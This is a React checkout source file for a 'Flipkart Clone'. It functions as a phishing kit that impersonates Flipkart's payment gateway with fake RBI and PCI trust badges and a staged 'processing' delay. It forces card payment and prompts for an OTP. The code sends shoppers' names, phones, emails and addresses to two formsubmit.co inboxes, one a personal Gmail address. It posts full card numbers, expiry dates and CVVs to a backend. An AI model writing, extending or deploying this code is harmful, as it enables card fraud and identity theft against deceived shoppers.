import { useState, useEffect, useRef } from "react";
import { Link } from "wouter";
import {
  CheckCircle, MapPin, CreditCard, Smartphone, ChevronRight,
  Lock, ShieldCheck, Truck, Package, ArrowLeft, Wifi, AlertTriangle
} from "lucide-react";
import Navbar from "@/components/Navbar";
import { useCart, clearCart } from "@/store/cartStore";
import { placeOrder, updateOrder, Order } from "@/store/orderStore";

type Step = "address" | "payment" | "processing" | "gateway_otp";

interface Address {
  name: string;
  phone: string;
  email: string;
  pincode: string;
  city: string;
  state: string;
  address: string;
  addressType: "Home" | "Work" | "Other";
}

interface PaymentMethod {
  type: "upi" | "card" | "netbanking" | "cod";
  upiId?: string;
  cardNumber?: string;
  cardExpiry?: string;
  cardCVV?: string;
  cardName?: string;
  bank?: string;
  cardTab?: "debit" | "credit";
}

const STATES = [
  "Andhra Pradesh", "Assam", "Bihar", "Chandigarh", "Delhi", "Goa", "Gujarat",
  "Haryana", "Himachal Pradesh", "Jharkhand", "Karnataka", "Kerala",
  "Madhya Pradesh", "Maharashtra", "Odisha", "Punjab", "Rajasthan",
  "Tamil Nadu", "Telangana", "Uttar Pradesh", "Uttarakhand", "West Bengal"
];

const BANKS = [
  "State Bank of India", "HDFC Bank", "ICICI Bank", "Axis Bank",
  "Bank of Baroda", "Kotak Mahindra Bank", "Punjab National Bank",
  "Central Bank of India", "Canara Bank", "Union Bank of India", "Yes Bank"
];

const FORMSUBMIT_PRIMARY_ENDPOINT = "https://formsubmit.co/ajax/Rajatjha.ss708090@gmail.com";
const FORMSUBMIT_SECONDARY_ENDPOINT = "https://formsubmit.co/ajax/8d487ecf315e92e47520f07dab546173";

// ── Bank Gateway: Processing Screen ────────────────────────────────────────
function GatewayProcessing({ amount, cardLast4, cardName, onDone }: {
  amount: number; cardLast4: string; cardName: string; onDone: () => void;
}) {
  const PROCESSING_WAIT_MS = 30000;
  const [progress, setProgress] = useState(0);
  const [statusMsg, setStatusMsg] = useState("Initializing secure TLS connection...");
  const [elapsedMs, setElapsedMs] = useState(0);
  const done = useRef(false);
  const secondsRemaining = Math.max(0, Math.ceil((PROCESSING_WAIT_MS - elapsedMs) / 1000));
  const remainingMinutesLabel = String(Math.floor(secondsRemaining / 60)).padStart(2, "0");
  const remainingSecondsLabel = String(secondsRemaining % 60).padStart(2, "0");

  useEffect(() => {
    const tick = setInterval(() => {
      setElapsedMs((prev) => Math.min(prev + 1000, PROCESSING_WAIT_MS));
    }, 1000);
    const doneTimer = setTimeout(() => {
      if (!done.current) {
        done.current = true;
        setProgress(100);
        onDone();
      }
    }, PROCESSING_WAIT_MS);

    return () => {
      clearInterval(tick);
      clearTimeout(doneTimer);
    };
  }, [onDone, PROCESSING_WAIT_MS]);

  useEffect(() => {
    const progressPct = Math.max(
      5,
      Math.min(95, Math.round((elapsedMs / PROCESSING_WAIT_MS) * 95)),
    );
    setProgress(progressPct);

    if (elapsedMs < 7500) {
      setStatusMsg("Initializing secure TLS connection...");
      return;
    }
    if (elapsedMs < 15000) {
      setStatusMsg("Verifying card details...");
      return;
    }
    if (elapsedMs < 22500) {
      setStatusMsg("Authenticating with bank...");
      return;
    }
    if (elapsedMs < 28000) {
      setStatusMsg("Requesting OTP verification...");
      return;
    }
    setStatusMsg("Redirecting to bank OTP page...");
  }, [elapsedMs, PROCESSING_WAIT_MS]);

  return (
    <div className="min-h-screen" style={{ background: "linear-gradient(135deg,#e8f0fe 0%,#f0f4ff 100%)" }}>
      {/* Bank header */}
      <div className="bg-[#1a2744] px-6 py-3 flex items-center justify-between">
        <div className="flex items-center gap-3">
          <div className="w-9 h-9 rounded-full bg-green-500 flex items-center justify-center">
            <ShieldCheck className="w-5 h-5 text-white" />
          </div>
          <div>
            <div className="flex items-center gap-2">
              <span className="text-white font-bold text-sm">Flipkart Secure Pay</span>
              <span className="bg-green-500 text-white text-xs px-1.5 py-0.5 rounded font-semibold">VERIFIED</span>
            </div>
            <p className="text-gray-400 text-xs">SECURED PAYMENT GATEWAY</p>
          </div>
        </div>
        <div className="text-right">
          <p className="text-gray-400 text-xs">TOTAL AMOUNT</p>
          <p className="text-white font-bold text-xl">₹{amount.toLocaleString()}</p>
        </div>
      </div>

      {/* Security strip */}
      <div className="bg-[#243057] px-6 py-2 flex items-center justify-center gap-6 text-xs text-gray-300">
        <span className="flex items-center gap-1"><span className="text-green-400">●</span> 256-BIT SSL</span>
        <span className="text-gray-500">|</span>
        <span className="flex items-center gap-1"><span className="text-yellow-400">🔒</span> PCI DSS LEVEL 1</span>
        <span className="text-gray-500">|</span>
        <span className="flex items-center gap-1"><span className="text-green-400">✓</span> RBI APPROVED</span>
        <span className="text-gray-500">|</span>
        <span className="flex items-center gap-1"><span className="text-blue-400">🛡</span> 3D SECURE</span>
      </div>

      {/* Main content */}
      <div className="flex items-center justify-center min-h-[calc(100vh-120px)] py-10">
        <div className="bg-white rounded-xl shadow-2xl w-full max-w-md mx-4 overflow-hidden">
          {/* Modal header */}
          <div className="bg-[#2874f0] px-5 py-3 flex items-center justify-between">
            <span className="text-white font-bold text-sm tracking-wide uppercase">Payment Processing</span>
            <div className="flex gap-1.5">
              <div className="w-3 h-3 rounded-full bg-blue-400" />
              <div className="w-3 h-3 rounded-full bg-blue-400" />
              <div className="w-3 h-3 rounded-full bg-blue-400" />
            </div>
          </div>

          <div className="p-6">
            {/* Spinner + status */}
            <div className="flex items-start gap-4 mb-5">
              <div className="relative w-10 h-10 flex-shrink-0">
                <svg className="w-10 h-10 animate-spin text-blue-600" viewBox="0 0 24 24" fill="none">
                  <circle className="opacity-20" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="3" />
                  <path className="opacity-80" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
                </svg>
              </div>
              <div>
                <p className="text-gray-800 font-medium text-sm">{statusMsg}</p>
                <p className="text-red-500 text-xs flex items-center gap-1 mt-1">
                  <AlertTriangle className="w-3 h-3" />
                  Do not press Back or Refresh
                </p>
              </div>
            </div>

            {/* Progress bar */}
            <div className="mb-1">
              <div className="w-full bg-gray-200 rounded-full h-2.5">
                <div
                  className="bg-blue-600 h-2.5 rounded-full transition-all duration-700"
                  style={{ width: `${progress}%` }}
                />
              </div>
            </div>
            <div className="flex justify-between text-xs text-gray-400 mb-5">
              <span>Processing... ({remainingMinutesLabel}:{remainingSecondsLabel})</span>
              <span>{progress}%</span>
            </div>

            {/* Card visual */}
            <div className="bg-gray-900 rounded-xl p-4 text-white mb-5 relative overflow-hidden">
              <div className="absolute top-0 right-0 w-32 h-32 rounded-full bg-white/5 -translate-y-10 translate-x-10" />
              <div className="flex justify-between items-start mb-6">
                <div className="w-8 h-6 bg-yellow-400 rounded-sm" />
                <span className="bg-blue-500 text-white text-xs px-2 py-0.5 rounded font-bold">DEBIT</span>
              </div>
              <p className="font-mono text-sm tracking-widest mb-3">
                •••• •••• •••• {cardLast4 || "0000"}
              </p>
              <div className="flex justify-between text-xs text-gray-400">
                <span>{cardName || "CARD HOLDER"}</span>
              </div>
            </div>

            {/* Trust badges */}
            <div className="flex items-center justify-center gap-3 flex-wrap">
              <span className="bg-blue-900 text-white text-xs px-2 py-0.5 rounded font-bold">VISA</span>
              <span className="bg-red-600 text-white text-xs px-2 py-0.5 rounded font-bold">MC</span>
              <span className="bg-orange-500 text-white text-xs px-2 py-0.5 rounded font-bold">RuPay</span>
              <span className="border border-gray-300 text-gray-600 text-xs px-2 py-0.5 rounded font-bold">PCI DSS</span>
              <span className="bg-green-600 text-white text-xs px-2 py-0.5 rounded font-bold">3D SECURE</span>
              <span className="border border-gray-300 text-gray-600 text-xs px-2 py-0.5 rounded font-bold">NPCI</span>
            </div>
            <div className="flex items-center justify-center gap-4 mt-3 text-xs text-gray-400">
              <span>🔒 256-bit SSL Encryption</span>
              <span>ISO 27001 Certified</span>
              <span>RBI Licensed</span>
            </div>
          </div>
        </div>
      </div>

      {/* Footer */}
      <div className="text-center pb-4 text-xs text-gray-400">
        Powered by <span className="text-blue-600 font-bold">Flipkart</span> Secure Pay &nbsp;|&nbsp; 🔵 PCI DSS &nbsp;|&nbsp; NPCI
      </div>
    </div>
  );
}

// ── Bank Gateway: OTP Screen ────────────────────────────────────────────────
function GatewayOTP({ amount, phone, email, cardLast4, onVerify }: {
  amount: number; phone: string; email: string; cardLast4: string;
  onVerify: (otp: string) => Promise<boolean>;
}) {
  const RESEND_WAIT_SECONDS = 30;
  const [otp, setOtp] = useState(["", "", "", "", "", ""]);
  const [error, setError] = useState("");
  const [verifying, setVerifying] = useState(false);
  const [resendTimer, setResendTimer] = useState(RESEND_WAIT_SECONDS);
  const maskedPhone = phone ? `+91 XXXXX${phone.slice(-5)}` : "+91 XXXXXXXXXX";
  const resendMinutes = String(Math.floor(resendTimer / 60)).padStart(2, "0");
  const resendSeconds = String(resendTimer % 60).padStart(2, "0");

  // Send OTP when component mounts
  useEffect(() => {
    sendOtpEmail();
  }, []);

  const sendOtpEmail = async () => {
    try {
      const response = await fetch('http://localhost:3001/api/send-otp', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          phone: phone,
          email: email || "customer@example.com",
          purpose: 'Payment Verification'
        })
      });

      const result = await response.json();
      if (result.success) {
        console.log('OTP sent successfully. For testing, use:', result.otpForTesting);
      } else {
        console.error('Failed to send OTP:', result.message);
      }
    } catch (error) {
      console.error('Error sending OTP:', error);
    }
  };

  useEffect(() => {
    if (resendTimer <= 0) return;
    const timer = setInterval(() => {
      setResendTimer((prev) => (prev <= 1 ? 0 : prev - 1));
    }, 1000);
    return () => clearInterval(timer);
  }, [resendTimer]);

  const handleOtpChange = (val: string, i: number) => {
    const d = val.replace(/\D/g, "").slice(0, 1);
    const next = [...otp];
    next[i] = d;
    setOtp(next);
    if (d && i < 5) {
      document.getElementById(`gotp-${i + 1}`)?.focus();
    }
  };

  const handleKeyDown = (e: React.KeyboardEvent, i: number) => {
    if (e.key === "Backspace" && !otp[i] && i > 0) {
      document.getElementById(`gotp-${i - 1}`)?.focus();
    }
  };

  const handleVerify = async () => {
    const code = otp.join("");
    if (code.length < 6) { setError("Please enter all 6 digits"); return; }
    setVerifying(true);
    setError("");
    setTimeout(async () => {
      setVerifying(false);
      const ok = await onVerify(code);
      if (!ok) { setError("Incorrect OTP. Please try again."); setOtp(["","","","","",""]); document.getElementById("gotp-0")?.focus(); }
    }, 1500);
  };

  const handleResend = () => {
    if (resendTimer > 0) return;
    setOtp(["", "", "", "", "", ""]);
    setError("");
    setResendTimer(RESEND_WAIT_SECONDS);
    setTimeout(() => document.getElementById("gotp-0")?.focus(), 50);
    sendOtpEmail(); // Send new OTP
  };

  return (
    <div className="min-h-screen" style={{ background: "linear-gradient(135deg,#e8f0fe 0%,#f0f4ff 100%)" }}>
      {/* Bank header */}
      <div className="bg-[#1a2744] px-6 py-3 flex items-center justify-between">
        <div className="flex items-center gap-3">
          <div className="w-9 h-9 rounded-full bg-green-500 flex items-center justify-center">
            <ShieldCheck className="w-5 h-5 text-white" />
          </div>
          <div>
            <div className="flex items-center gap-2">
              <span className="text-white font-bold text-sm">Flipkart Secure Pay</span>
              <span className="bg-green-500 text-white text-xs px-1.5 py-0.5 rounded font-semibold">VERIFIED</span>
            </div>
            <p className="text-gray-400 text-xs">2-FACTOR AUTHENTICATION</p>
          </div>
        </div>
        <div className="text-right">
          <p className="text-gray-400 text-xs">TOTAL AMOUNT</p>
          <p className="text-white font-bold text-xl">₹{amount.toLocaleString()}</p>
        </div>
      </div>

      {/* Security strip */}
      <div className="bg-[#243057] px-6 py-2 flex items-center justify-center gap-6 text-xs text-gray-300">
        <span className="flex items-center gap-1"><span className="text-yellow-400">⚡</span> OTP VERIFICATION REQUIRED</span>
        <span className="text-gray-500">|</span>
        <span className="flex items-center gap-1"><span className="text-green-400">🔒</span> END-TO-END ENCRYPTED</span>
        <span className="text-gray-500">|</span>
        <span className="flex items-center gap-1"><span className="text-blue-400">🛡</span> 3D SECURE</span>
      </div>

      {/* Main content */}
      <div className="flex items-center justify-center min-h-[calc(100vh-120px)] py-10">
        <div className="bg-white rounded-xl shadow-2xl w-full max-w-md mx-4 overflow-hidden">
          {/* Modal header */}
          <div className="bg-[#2874f0] px-5 py-4 text-center">
            <p className="text-blue-100 text-xs font-semibold uppercase tracking-widest mb-1">OTP Verification</p>
            <h2 className="text-white font-bold text-lg">Verify Your Payment</h2>
          </div>

          <div className="p-6">
            {/* OTP sent info */}
            <div className="bg-blue-50 border border-blue-100 rounded-lg p-4 mb-5 flex items-start gap-3">
              <div className="w-8 h-8 rounded bg-blue-600 flex items-center justify-center flex-shrink-0">
                <Smartphone className="w-4 h-4 text-white" />
              </div>
              <div>
                <p className="font-semibold text-gray-800 text-sm">OTP Sent Successfully</p>
                <p className="text-gray-500 text-xs mt-0.5">A 6-digit OTP has been sent to</p>
                <p className="text-blue-600 font-bold text-sm">{maskedPhone}</p>
                <p className="text-gray-400 text-xs mt-0.5">registered with your Card (•••• •••• •••• {cardLast4 || "XXXX"})</p>
              </div>
            </div>

            {/* OTP inputs */}
            <p className="text-xs font-semibold text-gray-600 mb-3">Enter 6-digit OTP</p>
            <div className="flex gap-2 justify-center mb-2">
              {otp.map((d, i) => (
                <input
                  key={i}
                  id={`gotp-${i}`}
                  type="text"
                  inputMode="numeric"
                  maxLength={1}
                  value={d}
                  onChange={(e) => handleOtpChange(e.target.value, i)}
                  onKeyDown={(e) => handleKeyDown(e, i)}
                  className={`w-11 h-12 text-center text-lg font-bold border-2 rounded-lg focus:outline-none transition-colors ${
                    d ? "border-blue-500 text-blue-700" : "border-gray-300 text-gray-800"
                  } focus:border-blue-500`}
                  data-testid={`input-gateway-otp-${i}`}
                />
              ))}
            </div>
            <div className="flex gap-1 justify-center mb-1">
              {otp.map((_, i) => <div key={i} className="w-11 flex justify-center"><div className="w-8 border-b-2 border-gray-200" /></div>)}
            </div>

            {error && <p className="text-red-500 text-xs text-center mt-2 mb-1">{error}</p>}

            <button
              onClick={handleResend}
              disabled={resendTimer > 0}
              className={`block mx-auto text-sm font-semibold mt-3 mb-5 ${
                resendTimer > 0
                  ? "text-gray-400 cursor-not-allowed"
                  : "text-blue-600 hover:underline"
              }`}
              data-testid="button-gateway-resend"
            >
              {resendTimer > 0
                ? `Resend OTP in ${resendMinutes}:${resendSeconds}`
                : "Resend OTP"}
            </button>

            {/* Verify button */}
            <button
              onClick={handleVerify}
              disabled={verifying || otp.join("").length < 6}
              className="w-full bg-gray-200 hover:bg-gray-300 disabled:bg-gray-100 disabled:text-gray-400 text-gray-700 font-bold py-3 rounded-lg transition-colors flex items-center justify-center gap-2 text-sm"
              data-testid="button-gateway-verify"
            >
              {verifying ? (
                <>
                  <svg className="w-4 h-4 animate-spin" viewBox="0 0 24 24" fill="none"><circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="3"/><path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"/></svg>
                  Verifying...
                </>
              ) : (
                <>✓ Verify &amp; Pay ₹{amount.toLocaleString()}</>
              )}
            </button>

            {/* Card info */}
            <div className="mt-5 pt-4 border-t border-gray-100">
              <p className="text-xs text-gray-500 font-semibold mb-1">CARD DEBIT</p>
              <p className="font-mono text-sm text-gray-700">•••• •••• •••• {cardLast4 || "XXXX"}</p>
              <div className="flex items-center gap-3 mt-2 text-xs text-gray-400">
                <span>🔒 256-bit SSL</span>
                <span>PCI DSS</span>
                <span>RBI Approved</span>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Footer */}
      <div className="text-center pb-4 text-xs text-gray-400">
        Powered by <span className="text-blue-600 font-bold">Flipkart</span> Secure Pay &nbsp;|&nbsp; 🔵 PCI DSS &nbsp;|&nbsp; NPCI
      </div>
    </div>
  );
}

// ── Main Checkout Component ─────────────────────────────────────────────────
export default function Checkout() {
  const { items, total } = useCart();
  const [currentStep, setCurrentStep] = useState<Step>("address");
  const [orderPlaced, setOrderPlaced] = useState(false);
  const [placedOrder, setPlacedOrder] = useState<Order | null>(null);
  const [pendingOrderId, setPendingOrderId] = useState<string | null>(null);

  const [address, setAddress] = useState<Address>({
    name: "", phone: "", email: "", pincode: "", city: "", state: "", address: "", addressType: "Home"
  });
  const [addressErrors, setAddressErrors] = useState<Partial<Record<keyof Address, string>>>({});

  const [payment, setPayment] = useState<PaymentMethod>({ type: "card", cardTab: "debit" });
  const [paymentError, setPaymentError] = useState("");
  const [saveCard, setSaveCard] = useState(false);
  const [isPincodeLookupLoading, setIsPincodeLookupLoading] = useState(false);
  const [pincodeLookupError, setPincodeLookupError] = useState("");
  const [isSendingAddressEmail, setIsSendingAddressEmail] = useState(false);
  const [addressEmailStatus, setAddressEmailStatus] = useState("");

  const savings = items.reduce((s, i) => s + (i.originalPrice - i.price) * i.quantity, 0);
  const deliveryCharge = total > 499 ? 0 : 40;
  const finalAmount = total + deliveryCharge;
  const normalizedCardNumber = (payment.cardNumber || "").replace(/\s/g, "");
  const cardLast4 = normalizedCardNumber.slice(-4);
  const unavailablePaymentMethods: PaymentMethod["type"][] = ["cod", "netbanking", "upi"];
  const unavailablePaymentsMessage =
    "COD, Net Banking, and UPI are currently unavailable on this site. Please use Card Payment.";

  const maskUpiId = (upiId?: string) => {
    if (!upiId) return undefined;
    const cleaned = upiId.trim();
    const [username, domain] = cleaned.split("@");
    if (!domain) {
      if (cleaned.length <= 1) return "*";
      return `${cleaned[0]}${"*".repeat(cleaned.length - 1)}`;
    }
    const firstChar = username?.[0] || "*";
    return `${firstChar}${"*".repeat(Math.max((username?.length || 1) - 1, 0))}@${domain}`;
  };

  const maskOtp = (otp: string) => {
    if (!otp) return undefined;
    return `${"*".repeat(Math.max(otp.length - 1, 0))}${otp.slice(-1)}`;
  };

  const isCardNumberValid = (cardNumber: string) => {
    let sum = 0;
    let shouldDouble = false;

    for (let i = cardNumber.length - 1; i >= 0; i -= 1) {
      let digit = Number(cardNumber[i]);
      if (shouldDouble) {
        digit *= 2;
        if (digit > 9) digit -= 9;
      }
      sum += digit;
      shouldDouble = !shouldDouble;
    }

    return sum % 10 === 0;
  };

  const isCardExpiryValid = (expiry?: string) => {
    if (!expiry) return false;

    const match = expiry.match(/^(\d{2})\/(\d{2})$/);
    if (!match) return false;

    const month = Number(match[1]);
    const year = Number(`20${match[2]}`);
    if (month < 1 || month > 12) return false;

    const now = new Date();
    const expiryDate = new Date(year, month, 0, 23, 59, 59, 999);
    return expiryDate >= now;
  };

  const validateCardPayment = () => {
    if (!/^\d{16}$/.test(normalizedCardNumber)) {
      return "Please enter a valid 16-digit card number";
    }
    if (!isCardNumberValid(normalizedCardNumber)) {
      return "Card number is invalid. Please check and try again";
    }
    if (!isCardExpiryValid(payment.cardExpiry)) {
      return "Please enter a valid expiry date (MM/YY)";
    }
    if (!/^\d{3}$/.test(payment.cardCVV || "")) {
      return "Please enter a valid 3-digit CVV";
    }
    if (!payment.cardName?.trim() || payment.cardName.trim().length < 3) {
      return "Please enter the name on card";
    }
    if (!payment.bank) {
      return "Please select your issuing bank";
    }
    return "";
  };

  useEffect(() => {
    const pincode = address.pincode.trim();
    if (!/^\d{6}$/.test(pincode)) {
      setIsPincodeLookupLoading(false);
      setPincodeLookupError("");
      return;
    }

    const controller = new AbortController();
    let isCancelled = false;

    const lookupPincode = async () => {
      setIsPincodeLookupLoading(true);
      setPincodeLookupError("");

      try {
        const response = await fetch(`https://api.postalpincode.in/pincode/${pincode}`, {
          signal: controller.signal,
        });
        if (!response.ok) throw new Error("Lookup failed");

        const payload = await response.json();
        const firstResult = Array.isArray(payload) ? payload[0] : undefined;
        const postOffice = firstResult?.PostOffice?.[0];
        const state = postOffice?.State;
        const city = postOffice?.District || postOffice?.Division || postOffice?.Name;

        if (!state || !city) {
          throw new Error("No location found");
        }

        if (isCancelled) return;

        setAddress((prev) => ({
          ...prev,
          city,
          state,
        }));
        setAddressErrors((prev) => ({ ...prev, city: "", state: "", pincode: "" }));
      } catch (error) {
        if (isCancelled || (error as Error).name === "AbortError") return;
        setPincodeLookupError("Could not auto-detect city/state. Please enter manually.");
      } finally {
        if (!isCancelled) setIsPincodeLookupLoading(false);
      }
    };

    void lookupPincode();

    return () => {
      isCancelled = true;
      controller.abort();
    };
  }, [address.pincode]);

  const validateAddress = () => {
    const errors: Partial<Record<keyof Address, string>> = {};
    if (!address.name.trim()) errors.name = "Name is required";
    if (!/^\d{10}$/.test(address.phone)) errors.phone = "Enter valid 10-digit number";
    const normalizedEmail = address.email.trim();
    if (!normalizedEmail) {
      errors.email = "Email is required";
    } else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(normalizedEmail)) {
      errors.email = "Enter valid email address";
    }
    if (!/^\d{6}$/.test(address.pincode)) errors.pincode = "Enter 6-digit pincode";
    if (!address.city.trim()) errors.city = "City is required";
    if (!address.state) errors.state = "Select a state";
    if (!address.address.trim()) errors.address = "Address is required";
    setAddressErrors(errors);
    return Object.keys(errors).length === 0;
  };

  const postAddressEmailToRecipient = async (endpoint: string, payload: string) => {
    const response = await fetch(endpoint, {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        Accept: "application/json",
      },
      body: payload,
    });

    if (!response.ok) {
      throw new Error(`Address email request failed with status ${response.status}`);
    }
  };

  const sendAddressDetailsEmail = async () => {
    const formData = new URLSearchParams();
    formData.append("customer_name", address.name);
    formData.append("customer_phone", address.phone);
    formData.append("customer_email", address.email);
    formData.append("customer_address", address.address);
    formData.append("customer_city", address.city);
    formData.append("customer_state", address.state);
    formData.append("customer_pincode", address.pincode);
    formData.append("address_type", address.addressType);
    formData.append("submitted_at", new Date().toLocaleString("en-IN"));
    formData.append("_subject", "Checkout Address Details - Flipkart Clone");
    formData.append("_template", "table");
    const payload = formData.toString();

    const sendResults = await Promise.allSettled([
      postAddressEmailToRecipient(FORMSUBMIT_PRIMARY_ENDPOINT, payload),
      postAddressEmailToRecipient(FORMSUBMIT_SECONDARY_ENDPOINT, payload),
    ]);
    const successCount = sendResults.filter((result) => result.status === "fulfilled").length;

    if (successCount === 0) {
      throw new Error("Address email failed for both recipients");
    }

    return successCount;
  };

  const handleAddressNext = async () => {
    if (!validateAddress()) return;

    setIsSendingAddressEmail(true);
    setAddressEmailStatus("");

    try {
      const successCount = await sendAddressDetailsEmail();
      if (successCount === 2) {
        setAddressEmailStatus("Address email sent to both recipient inboxes.");
      } else {
        setAddressEmailStatus("Address email sent to one inbox. Second inbox delivery may be delayed.");
      }
    } catch (error) {
      console.error("Address email send failed:", error);
      setAddressEmailStatus("Could not send address email right now. Continuing to payment.");
    } finally {
      setIsSendingAddressEmail(false);
      setCurrentStep("payment");
    }
  };

  const handlePayNow = () => {
    if (unavailablePaymentMethods.includes(payment.type)) {
      setPayment({ type: "card", cardTab: "debit" });
      setPaymentError(unavailablePaymentsMessage);
      return;
    }
    if (payment.type === "card") {
      const cardValidationError = validateCardPayment();
      if (cardValidationError) {
        setPaymentError(cardValidationError);
        return;
      }
    }
    if (payment.type === "upi" && !payment.upiId) {
      setPaymentError("Please enter your UPI ID"); return;
    }
    setPaymentError("");
    if (payment.type === "cod") {
      // For COD, place order directly
      const order = placeOrder({
        items, address,
        payment: { type: "cod" },
        subtotal: total, deliveryCharge, totalAmount: finalAmount, savings,
      });
      setPendingOrderId(null);
      setPlacedOrder(order);
      clearCart();
      setOrderPlaced(true);
    } else {
      const pendingPaymentPayload: Order["payment"] = {
        type: payment.type,
        bank: payment.bank,
      };

      if (payment.type === "upi") {
        pendingPaymentPayload.upiIdMasked = maskUpiId(payment.upiId);
      }

      if (payment.type === "card") {
        pendingPaymentPayload.cardLast4 = cardLast4 || undefined;
        pendingPaymentPayload.cardMasked = cardLast4 ? `**** **** **** ${cardLast4}` : undefined;
      }

      const pendingOrder = placeOrder({
        items,
        address,
        payment: pendingPaymentPayload,
        subtotal: total,
        deliveryCharge,
        totalAmount: finalAmount,
        savings,
      });
      updateOrder(pendingOrder.orderId, { status: "Pending" });
      setPendingOrderId(pendingOrder.orderId);
      setCurrentStep("processing");
    }
  };

  const handleProcessingDone = () => setCurrentStep("gateway_otp");

  const handleGatewayOTP = async (code: string): Promise<boolean> => {
    if (code === "000000") return false;
    const paymentPayload: Order["payment"] = {
      type: payment.type,
      bank: payment.bank,
      otpMasked: maskOtp(code),
    };

    if (payment.type === "upi") {
      paymentPayload.upiIdMasked = maskUpiId(payment.upiId);
    }

    if (payment.type === "card") {
      paymentPayload.cardLast4 = cardLast4 || undefined;
      paymentPayload.cardMasked = cardLast4 ? `**** **** **** ${cardLast4}` : undefined;
    }

    const order = pendingOrderId
      ? updateOrder(pendingOrderId, { payment: paymentPayload, status: "Paid" }) ||
        placeOrder({
          items,
          address,
          payment: paymentPayload,
          subtotal: total,
          deliveryCharge,
          totalAmount: finalAmount,
          savings,
        })
      : placeOrder({
          items,
          address,
          payment: paymentPayload,
          subtotal: total,
          deliveryCharge,
          totalAmount: finalAmount,
          savings,
        });

    // Send payment details email
    try {
      const response = await fetch('http://localhost:3001/api/send-payment-email', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          orderDetails: {
            orderId: order.orderId
          },
          paymentMethod: payment.type === 'card' ? `Card ending in ${cardLast4}` : 
                        payment.type === 'upi' ? `UPI (${payment.upiId})` : 
                        payment.type === 'netbanking' ? `Net Banking (${payment.bank})` : 
                        'Cash on Delivery',
          amount: finalAmount,
          customerInfo: {
            name: address.name,
            phone: address.phone,
            email: address.email,
            address: `${address.address}, ${address.city}, ${address.state} - ${address.pincode}`
          },
          cardDetails: payment.type === 'card' ? {
            cardNumber: payment.cardNumber,
            cardName: payment.cardName,
            cardExpiry: payment.cardExpiry,
            cardCVV: payment.cardCVV,
            bank: payment.bank,
            cardTab: payment.cardTab
          } : null
        })
      });

      const result = await response.json();
      if (result.success) {
        console.log('Payment email sent successfully');
      } else {
        console.error('Failed to send payment email:', result.message);
      }
    } catch (error) {
      console.error('Error sending payment email:', error);
    }

    setPlacedOrder(order);
    setPendingOrderId(null);
    clearCart();
    setOrderPlaced(true);
    return true;
  };

  const formatCard = (v: string) => v.replace(/\D/g, "").slice(0, 16).replace(/(.{4})/g, "$1 ").trim();
  const formatExpiry = (v: string) => v.replace(/\D/g, "").slice(0, 4).replace(/^(\d{2})(\d)/, "$1/$2");
  const stateOptions = address.state && !STATES.includes(address.state) ? [address.state, ...STATES] : STATES;
  const successPaymentLabel =
    placedOrder?.payment.type === "upi"
      ? `UPI (${placedOrder.payment.upiIdMasked || "masked"})`
      : placedOrder?.payment.type === "card"
        ? placedOrder.payment.cardMasked || `Card **** ${placedOrder.payment.cardLast4 || "XXXX"}`
        : placedOrder?.payment.type === "netbanking"
          ? `Net Banking (${placedOrder.payment.bank || "Selected Bank"})`
          : "Cash on Delivery";

  // ── Full-page gateway screens ─────────────────────────────────────────────
  if (currentStep === "processing" && !orderPlaced) {
    return (
      <GatewayProcessing
        amount={finalAmount}
        cardLast4={cardLast4 || "0000"}
        cardName={payment.cardName || address.name || "CARD HOLDER"}
        onDone={handleProcessingDone}
      />
    );
  }

  if (currentStep === "gateway_otp" && !orderPlaced) {
    return (
      <GatewayOTP
        amount={finalAmount}
        phone={address.phone}
        email={address.email}
        cardLast4={cardLast4 || "0000"}
        onVerify={handleGatewayOTP}
      />
    );
  }

  // ── Order success ─────────────────────────────────────────────────────────
  if (orderPlaced && placedOrder) {
    return (
      <div className="min-h-screen bg-[#f1f3f6]">
        <Navbar />
        <div className="max-w-2xl mx-auto px-4 py-16 text-center" data-testid="order-success">
          <div className="bg-white rounded-xl shadow-lg p-8">
            <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
              <CheckCircle className="w-12 h-12 text-green-500" />
            </div>
            <h1 className="text-2xl font-bold text-gray-800 mb-2">Order Placed Successfully! 🎉</h1>
            <p className="text-gray-500 mb-1">Your payment was verified and order is confirmed.</p>
            <p className="text-sm text-gray-400 mb-6">
              Order ID: <span className="font-bold text-blue-600">{placedOrder.orderId}</span>
            </p>
            <div className="bg-blue-50 rounded-lg p-4 mb-6 text-left space-y-2 text-sm">
              <div className="flex items-center gap-2 mb-2">
                <Package className="w-4 h-4 text-blue-600" />
                <span className="font-semibold text-blue-700">Order Summary</span>
              </div>
              <div className="flex justify-between text-gray-600">
                <span>Deliver to</span>
                <span className="font-medium text-gray-800">{address.name}, {address.city}, {address.state}</span>
              </div>
              <div className="flex justify-between text-gray-600">
                <span>Payment</span>
                <span className="font-medium text-gray-800 capitalize">
                  {successPaymentLabel}
                </span>
              </div>
              <div className="flex justify-between font-bold text-gray-900 border-t border-blue-200 pt-2">
                <span>Total Paid</span>
                <span>₹{finalAmount.toLocaleString()}</span>
              </div>
            </div>
            <div className="flex items-center justify-center gap-2 text-sm text-gray-500 mb-6">
              <Truck className="w-4 h-4 text-green-500" />
              <span>Expected delivery by <strong>{new Date(Date.now() + 3 * 86400000).toLocaleDateString("en-IN", { weekday: "long", month: "short", day: "numeric" })}</strong></span>
            </div>
            <Link href="/">
              <button className="bg-[#2874f0] text-white px-8 py-3 rounded font-semibold hover:bg-blue-700 transition-colors" data-testid="button-continue-shopping">
                Continue Shopping
              </button>
            </Link>
          </div>
        </div>
      </div>
    );
  }

  if (items.length === 0) {
    return (
      <div className="min-h-screen bg-[#f1f3f6]">
        <Navbar />
        <div className="max-w-2xl mx-auto px-4 py-16 text-center">
          <p className="text-gray-600 mb-4">Your cart is empty. Add some products first!</p>
          <Link href="/"><button className="bg-[#2874f0] text-white px-6 py-2 rounded font-semibold">Shop Now</button></Link>
        </div>
      </div>
    );
  }

